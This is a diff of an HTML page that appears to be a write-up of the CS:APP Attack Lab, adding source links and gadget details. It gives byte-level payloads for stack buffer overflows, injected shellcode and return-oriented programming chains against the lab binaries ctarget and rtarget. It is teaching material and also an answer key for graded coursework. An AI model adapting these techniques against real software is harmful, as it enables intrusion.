@@ -802,6 +802,8 @@
 </span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
 </span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="p">}</span>
 </span></code></pre></div>
+<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/tree/main/Attack_Lab/target1"><code>ctarget</code> · getbuf @ 4017a8–4017bd</a></p>
+<p>The sketch is <code>ctarget</code>'s <code>getbuf</code> at <code>0x4017a8</code>: <code>sub $0x28,%rsp</code> carves out the frame, <code>mov %rsp,%rdi</code> hands the buffer to <code>Gets</code>, and the function returns <code>1</code>. In GDB the entry <code>%rsp</code> is <code>0x5561dca0</code>, the word holding the saved return address, so the buffer begins <code>0x28</code> bytes lower at <code>0x5561dc78</code>.</p>
 <p>So bytes 0-39 fill the buffer and bytes 40-47 overwrite the <strong>saved return address</strong>. For this target instance: the buffer sits at <code>0x5561dc78</code>, the cookie is <code>0x59b997fa</code>, and the targets are <code>touch1 = 0x4017c0</code>, <code>touch2 = 0x4017ec</code>, <code>touch3 = 0x4018fa</code>.</p>
 </div>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>     high addresses
@@ -814,23 +816,31 @@
 </span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>    +----------------------------+  &lt;- 0x5561dc78  buf / %rsp
 </span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>     low addresses
 </span></code></pre></div>
+<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/tree/main/Attack_Lab/target1"><code>ctarget</code> · getbuf frame @ 4017a8–4017bd</a> (reformatted to fit)</p>
+
 <hr />
 <h2 id="phase-1-just-change-the-return-address">Phase 1 · just change the return address<a class="headerlink" href="#phase-1-just-change-the-return-address" title="Permanent link">¶</a></h2>
 <p>The simplest attack. <code>touch1</code> takes no argument — we only need <code>getbuf</code> to "return" into it. Fill 40 bytes of padding, then overwrite the return address with <code>touch1</code>:</p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>bytes 0-39 : 90 x 40                     (padding)
 </span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>bytes 40-47: c0 17 40 00 00 00 00 00     (-&gt; 0x4017c0 = touch1)
 </span></code></pre></div>
+<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase1.txt#L1-L6"><code>phase1.txt</code> L1–L6</a></p>
+
 <h2 id="phase-2-inject-code-to-set-the-cookie">Phase 2 · inject code to set the cookie<a class="headerlink" href="#phase-2-inject-code-to-set-the-cookie" title="Permanent link">¶</a></h2>
 <p><code>touch2</code> demands that its argument (<code>%rdi</code>) equal the cookie. Since the stack is executable in <code>ctarget</code>, we place a few instructions <strong>in the buffer</strong>, return into them, and let them set <code>%rdi</code> and jump onward:</p>
 <div class="language-asm highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nf">movl</span><span class="w"> </span><span class="no">$0x59b997fa</span><span class="p">,</span><span class="w"> </span><span class="nv">%edi</span><span class="w">     </span><span class="c1">; the cookie into the first-argument register</span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nf">push</span><span class="w"> </span><span class="no">$0x4017ec</span><span class="w">             </span><span class="c1">; push touch2's address ...</span>
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nf">ret</span><span class="w">                        </span><span class="c1">; ... and "return" to it</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nf">push</span><span class="w"> </span><span class="no">$0x4017ec</span><span class="w">             </span><span class="c1">; push touch2's address</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nf">ret</span><span class="w">                        </span><span class="c1">; "return" into touch2</span>
 </span></code></pre></div>
+<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase2.s#L1-L3"><code>phase2.s</code> L1–L3</a></p>
+
 <p>Assembled, that's <code>bf fa 97 b9 59 68 ec 17 40 00 c3</code>. Lay it at the buffer start, pad, and set the return address to the <strong>buffer itself</strong> (<code>0x5561dc78</code>) so <code>getbuf</code> returns straight into our code:</p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>bytes 0-10 : bf fa 97 b9 59 68 ec 17 40 00 c3   (the shellcode above)
 </span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>bytes 11-39: 90 ...                                (padding)
 </span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>bytes 40-47: 78 dc 61 55 00 00 00 00             (-&gt; 0x5561dc78 = buffer)
 </span></code></pre></div>
+<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase2.txt#L1-L6"><code>phase2.txt</code> L1–L6</a></p>
+
 <h2 id="phase-3-pass-a-string-to-touch3">Phase 3 · pass a string to touch3<a class="headerlink" href="#phase-3-pass-a-string-to-touch3" title="Permanent link">¶</a></h2>
 <p><code>touch3</code> wants <code>%rdi</code> to point at the <strong>ASCII</strong> cookie, <code>"59b997fa"</code>. The string cannot stay inside the old <code>getbuf</code> buffer: <code>touch3</code> calls <code>hexmatch</code>, whose stack frame reuses that region. The submitted payload therefore places the string <strong>after the overwritten return address</strong>, at <code>buffer + 0x30 = 0x5561dca8</code>, and points <code>%edi</code> there.</p>
 <p>Because the stack grows downward, <code>touch3</code> and <code>hexmatch</code> build their frames at lower addresses. The cookie at <code>buf + 0x30</code> stays above those writes:</p>
@@ -838,10 +848,14 @@
 </span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nf">push</span><span class="w"> </span><span class="no">$0x4018fa</span><span class="w">             </span><span class="c1">; touch3</span>
 </span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="nf">ret</span>
 </span></code></pre></div>
+<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase3.txt#L1-L2"><code>phase3.txt</code> L1–L2</a> (the asm assembles to the first 11 bytes)</p>
+
 <div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>bytes 0-10 : bf a8 dc 61 55 68 fa 18 40 00 c3    (shellcode -&gt; %edi = 0x5561dca8)
 </span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>bytes 40-47: 78 dc 61 55 ...                        (return into the buffer, runs the code)
 </span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>bytes 48-56: 35 39 62 39 39 37 66 61 00           ("59b997fa\0" at 0x5561dca8)
 </span></code></pre></div>
+<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase3.txt#L1-L7"><code>phase3.txt</code> L1–L7</a></p>
+
 <div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>   high addresses
 </span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>     buf+0x30   "59b997fa\0"                 &lt;- %rsp on entry to touch3
 </span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>   --------------------------------------
@@ -849,6 +863,8 @@
 </span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>     buf+0x00   getbuf's old buffer          &lt;- reused by deeper stack frames
 </span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>   low addresses
 </span></code></pre></div>
+<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase3.txt#L6-L7"><code>phase3.txt</code> L6–L7</a></p>
+
 <p>This matches <code>phase3.txt</code>: the shellcode occupies the start of the buffer, the saved return address points back to that shellcode, and the cookie string <strong><code>59b997fa</code></strong> follows the return slot where nested calls cannot clobber it.</p>
 <hr />
 <h2 id="turning-to-rtarget-why-injection-stops-working">Turning to rtarget: why injection stops working<a class="headerlink" href="#turning-to-rtarget-why-injection-stops-working" title="Permanent link">¶</a></h2>
@@ -873,7 +889,7 @@
 <tr>
 <td><code>0x4019cc</code></td>
 <td><code>58 90 c3</code></td>
-<td><code>pop %rax ; ret</code></td>
+<td><code>pop %rax ; nop ; ret</code></td>
 <td>pop the next stack value into <code>%rax</code></td>
 </tr>
 <tr>
@@ -890,6 +906,8 @@
 </span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>bytes 56-63: a2 19 40 00 ...     (-&gt; mov %rax,%rdi)
 </span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>bytes 64-71: ec 17 40 00 ...     (-&gt; touch2)
 </span></code></pre></div>
+<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase4.txt#L6-L9"><code>phase4.txt</code> L6–L9</a></p>
+
 <h2 id="phase-5-computing-a-stack-address-at-runtime">Phase 5 · computing a stack address at runtime<a class="headerlink" href="#phase-5-computing-a-stack-address-at-runtime" title="Permanent link">¶</a></h2>
 <p>Phase 3's problem returns, now under ASLR: <code>touch3</code> needs <code>%rdi</code> pointing at the cookie string, but we no longer know any stack address. The way out is to <strong>read <code>%rsp</code> at runtime</strong> and add a known offset to it. The string is planted at the very end of the chain, and its distance from a captured <code>%rsp</code> is a constant — here <code>0x48</code>:</p>
 <table>
@@ -917,31 +935,31 @@
 <tr>
 <td>3</td>
 <td><code>0x4019ab</code></td>
-<td><code>pop %rax ; ret</code></td>
+<td><code>pop %rax ; nop ; ret</code></td>
 <td><code>%rax &lt;- 0x48</code> (the offset, next on the stack)</td>
 </tr>
 <tr>
 <td>4</td>
 <td><code>0x401a42</code></td>
-<td><code>mov %eax,%edx ; ret</code></td>
-<td>shuffle the offset ...</td>
+<td><code>mov %eax,%edx ; test %al,%al ; ret</code></td>
+<td>hold the offset in <code>%edx</code></td>
 </tr>
 <tr>
 <td>5</td>
 <td><code>0x401a34</code></td>
-<td><code>mov %edx,%ecx ; ret</code></td>
-<td>... through the only</td>
+<td><code>mov %edx,%ecx ; cmp %cl,%cl ; ret</code></td>
+<td>carry it on to <code>%ecx</code></td>
 </tr>
 <tr>
 <td>6</td>
 <td><code>0x401a13</code></td>
-<td><code>mov %ecx,%esi ; ret</code></td>
-<td>... available registers -&gt; <code>%esi</code></td>
+<td><code>mov %ecx,%esi ; nop ; nop ; ret</code></td>
+<td>land it in <code>%esi</code>, the register <code>lea</code> needs</td>
 </tr>
 <tr>
 <td>7</td>
 <td><code>0x4019d6</code></td>
-<td><code>lea (%rdi,%rsi,1),%rax</code></td>
+<td><code>lea (%rdi,%rsi,1),%rax ; ret</code></td>
 <td><code>%rax &lt;- base + offset</code> = string address</td>
 </tr>
 <tr>
@@ -970,7 +988,9 @@
 </span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>
 </span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>     offset = string(0x78) - captured %rsp(0x30) = 0x48
 </span></code></pre></div>
-<p>That is ROP in a nutshell: with no new code and no fixed addresses, a carefully ordered stack of pointers still computes exactly what the attacker needs.</p>
+<p class="code-source">Source: <a href="https://github.com/LeeXSean/csapp-labs/blob/main/Attack_Lab/target1/phase5.txt#L1-L16"><code>phase5.txt</code> L1–L16</a></p>
+
+<p>No new code and no fixed addresses: a carefully ordered stack of pointers computes the address the attacker needs.</p>
 
 
 
